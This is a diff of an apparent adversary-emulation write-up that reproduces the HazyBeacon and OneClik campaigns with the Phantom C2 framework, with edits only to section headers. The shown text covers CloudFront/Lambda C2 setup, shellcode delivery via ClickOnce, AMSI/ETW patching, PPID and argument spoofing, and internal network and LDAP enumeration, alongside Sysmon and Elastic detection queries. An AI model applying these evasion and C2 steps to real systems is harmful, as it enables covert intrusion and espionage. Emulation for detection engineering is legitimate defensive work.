@@ -225,7 +225,7 @@ Block `*.elastic.co` at the DNS level on the router in order to stop Elastic fro
 > **Emulates:** HazyBeacon's use of AWS Lambda Function URLs and CloudFront CDN for C2 communication
 > **ATT&CK:** T1102.002 (Web Service: Cloud API), T1071.001 (Application Layer Protocol: Web Protocols)
 
-### 5.1 - Deploy Phantom C2 on AWS with CloudFront
+### Deploy Phantom C2 on AWS with CloudFront
 
 This is the foundation of the entire emulation. Phantom's Lambda relay + CloudFront CDN architecture is a 1:1 match for HazyBeacon's C2 infrastructure.
 
@@ -255,7 +255,7 @@ After deployment, we noted its outputs:
 > [!NOTE]
 > **Adaptix alternative:** If you are using the [adaptix-serverless-c2](https://github.com/stillbigjosh/adaptix-serverless-c2) plugin, deploy with `./deploy.sh --dist <adaptix-dist> --cloudfront` following the plugin README. The resulting infrastructure (Lambda + CloudFront + DynamoDB) is identical.
 
-### 5.2 - Verify CloudFront Relay
+### Verify CloudFront Relay
 
 Should return 400 (relay works, no agent data)
 
@@ -273,7 +273,7 @@ curl -sI https://d1234abcdef.cloudfront.net/relay 2>&1 | grep -i "x-cache\|via"
 
 ![CloudFront headers](writeups/images/hazybeacon-emulation/cloudfront-headers-verify.png)
 
-### 5.3 - Start the Teamserver
+### Start the Teamserver
 
 ```bash
 cd /opt/phantom-c2 && ./phantom-server
@@ -283,7 +283,7 @@ cd /opt/phantom-c2 && ./phantom-server
 
 Open the operator UI at `https://<teamserver-ip>:50050` and log in.
 
-### 5.4 - Configure the Malleable Communication Profile
+### Configure the Malleable Communication Profile
 
 HazyBeacon's traffic appears as normal HTTPS to AWS domains. We configured the CloudFront profile to match:
 
@@ -293,7 +293,7 @@ We can replace `CLOUDFRONT_DOMAIN_HERE` with our actual CloudFront distribution 
 
 ![CloudFront profile configuration](writeups/images/hazybeacon-emulation/cloudfront-profile.png)
 
-### 5.5 - Why This Matters for Detection
+### Why This Matters for Detection
 
 At this point, any agent callback from a lab VM will appear in Elastic and on the network as:
 
@@ -313,13 +313,13 @@ This is identical to what HazyBeacon's targets saw. Enterprise firewalls, web pr
 > **Emulates:** OneClik campaign's ClickOnce delivery + HazyBeacon's shellcode execution
 > **ATT&CK:** T1204.002 (User Execution: Malicious File), T1566.002 (Spearphishing Link), T1055.012 (Process Injection: Process Hollowing)
 
-### 6.1 - Threat Intelligence Context
+### Threat Intelligence Context
 
 The OneClik campaign (Trellix) delivers the payload via ClickOnce deployment. The user clicks a link, ClickOnce installs and runs a .NET application that loads shellcode directly in memory. No files are dropped to disk. This matches the real-world infection chain: Phishing Email → Fake Hardware Analysis Site → ClickOnce Deployment → dfsvc.exe → Shellcode Execution → C2 Beacon.
 
 The OneClik campaign additionally used `ZSATray.exe` (Zscaler), `umt.exe` (Citrix), and `ied.exe` (Sony Imaging Edge Desktop) as alternative DLL hijacking hosts.
 
-### 6.2 - Generate Eclipse Shellcode (bin format)
+### Generate Eclipse Shellcode (bin format)
 
 Eclipse is the default WIndows agent of Phantom C2, this Windows agent is heavily inspired by Kharon Agent of Adaptix, but much more evasive and feature rich. 
 
@@ -341,7 +341,7 @@ The `bin` format produces a raw PIC (position-independent code) shellcode blob w
 
 ![Eclipse payload generation step 2](writeups/images/hazybeacon-emulation/eclipse-generate-2.png)
 
-### 6.3 - Deliver and Execute via ClickOnce
+### Deliver and Execute via ClickOnce
 
 ClickOnce is the delivery mechanism that matches the OneClik campaign exactly. The user clicks a link, the ClickOnce installer runs the application. Delivery and execution happen in a single user interaction, just like the real campaign.
 
@@ -541,7 +541,7 @@ We can then interact with it by right-clicking the beacon and hitting Console
 
 ![Eclipse agent console](writeups/images/hazybeacon-emulation/eclipse-console.png)
 
-### 6.4 - What Happens on Execution
+### What Happens on Execution
 
 **ClickOnce delivery (primary):**
 1. ClickOnce host process (`dfsvc.exe`) launches the `UpdateHelper.exe` dropper
@@ -552,7 +552,7 @@ We can then interact with it by right-clicking the beacon and hitting Console
 6. Process stays alive, Eclipse beacons in the background
 7. Network perspective: a .NET ClickOnce application making HTTPS calls to `cloudfront.net`
 
-### 6.5 - Confirm Agent Check-In
+### Confirm Agent Check-In
 
 ![Eclipse agent check-in](writeups/images/hazybeacon-emulation/eclipse-checkin.png)
 
@@ -568,7 +568,7 @@ Expected:
 - Process tree shows the dropper process as the host
 
 ![Process tree](writeups/images/hazybeacon-emulation/process-tree.png)
-### 6.6 - Troubleshooting
+### Troubleshooting
 
 | Symptom                                                       | Cause                                            | Fix                                                                                                           |
 | ------------------------------------------------------------- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------- |
@@ -607,7 +607,7 @@ aws dynamodb scan \
 
 Replace `<AGENT-ID>` with the short agent ID (e.g., `16ac14a7`), and adjust `phantom-inbound` and `us-east-1` to match your Dynamo-DB Table and AWS Zoning. Records will also TTL out automatically (default 24 hours).
 
-### 6.7 - Detection Opportunities (Initial Access)
+### Detection Opportunities (Initial Access)
 
 **ClickOnce execution chain (Sysmon Event ID 1, process creation):**
 
@@ -644,7 +644,7 @@ event.code:"3" AND process.parent.name:"dfsvc.exe" AND destination.domain:*cloud
 > **Emulates:** HazyBeacon's backdoor establishing C2 communication via Lambda
 > **ATT&CK:** T1071.001 (Web Protocols), T1573.002 (Encrypted Channel: Asymmetric Cryptography)
 
-### 7.1 - Configure the Agent for Stealth
+### Configure the Agent for Stealth
 
 Once the Eclipse agent checks in, configure it to match HazyBeacon's operational profile. HazyBeacon is an espionage implant: low-and-slow, blend with legitimate traffic, minimize forensic artifacts.
 
@@ -660,7 +660,7 @@ Once the Eclipse agent checks in, configure it to match HazyBeacon's operational
 | `spawnto RuntimeBroker.exe` | HazyBeacon runs under a trusted process              | Sacrificial process for fork-and-run operations (postex fork, execute-assembly). RuntimeBroker.exe is a common Windows process that blends in.                                                           |
 | `killdate.date 2026-12-31`  | OneClik had `kill_date: 2025-05-31`                  | Self-termination date (YYYY-MM-DD format). Agent self-destructs after this date. Standard operational security for controlled engagements.                                                               |
 
-### 7.2 - Verify C2 Communication Path
+### Verify C2 Communication Path
 
 Confirm the agent is communicating through CloudFront:
 
@@ -680,7 +680,7 @@ The traffic should appear as normal HTTPS to a CloudFront domain. No alerts shou
 > **Emulates:** OneClik's evasion techniques (ETW patching, anti-debugging, obfuscation)
 > **ATT&CK:** T1562.006 (Impair Defenses: ETW), T1622 (Debugger Evasion), T1027 (Obfuscated Files), T1140 (Deobfuscate/Decode)
 
-### 8.1 - ETW and AMSI Patching
+### ETW and AMSI Patching
 
 > Already configured in Phase 6.2:
 
@@ -690,7 +690,7 @@ config amsi_etw_bypass all
 
 This patches both AMSI (`AmsiScanBuffer`) and ETW (`EtwEventWrite`, `NtTraceEvent`) before any .NET or script execution. This directly mirrors the OneClik campaign's ETW patching, which truncates `EtwEventWrite` with `xor rax,rax; retn`.
 
-### 8.2 - Sleep Masking (Memory Encryption)
+### Sleep Masking (Memory Encryption)
 
 > Already configured in Phase 6.2:
 
@@ -707,7 +707,7 @@ During sleep, the Eclipse agent:
 
 This prevents memory scanners from finding the beacon during sleep, matching HazyBeacon's in-memory stealth profile.
 
-### 8.3 - Indirect Syscalls with Stack Spoofing
+### Indirect Syscalls with Stack Spoofing
 
 > Already configured in Phase 6.2:
 
@@ -720,7 +720,7 @@ All Nt* API calls route through `ntdll.dll` instruction addresses with a spoofed
 - CallTrace-based Sysmon detections
 - Stack-walking heuristics
 
-### 8.4 - Process Argument Spoofing and PPID Spoofing
+### Process Argument Spoofing and PPID Spoofing
 
 When executing commands that spawn child processes, spoof both the command-line arguments and the parent PID to blend into normal process trees:
 
@@ -734,7 +734,7 @@ config spoofarg "C:\Windows\System32\RuntimeBroker.exe -ServerName:RuntimeBroker
 - `ppid 808`: Any child process Eclipse spawns (via `shell`, `process create`, or fork-and-run) will appear to have `svchost.exe` (PID 808) as its parent instead of the ClickOnce host process. This breaks process-tree-based detection heuristics.
 - `spoofarg`: The child process PEB shows `RuntimeBroker.exe` as the command line, even though the actual process is different. Tools that read the PEB (like Process Explorer, Task Manager, and most EDR agents) see the spoofed arguments.
 
-### 8.5 - DLL Blocking in Child Processes
+### DLL Blocking in Child Processes
 
 ```
 config blockdlls on
@@ -756,7 +756,7 @@ systeminfo
 whoami
 ```
 
-### 9.2 - Domain Enumeration via LDAP BOFs
+### Domain Enumeration via LDAP BOFs
 
 Using the Extension-Kit AD-BOF `ldapsearch` module (inline BOF, no child process, no Sysmon network telemetry):
 
@@ -771,7 +771,7 @@ ldapsearch (objectClass=computer) -a sAMAccountName,operatingSystem,dNSHostName,
 ldapsearch (objectClass=group) -a sAMAccountName,member
 ```
 
-### 9.3 - Network Scanning
+### Network Scanning
 
 ```
 # SAR-BOF smartscan for internal network discovery
@@ -784,7 +784,7 @@ Or targeted port scan:
 smartscan 10.1.10.0/24 -p 445,3389,5985,1433
 ```
 
-### 9.4 - Share Enumeration
+### Share Enumeration
 
 ```
 fs ls \\10.1.10.22\C$
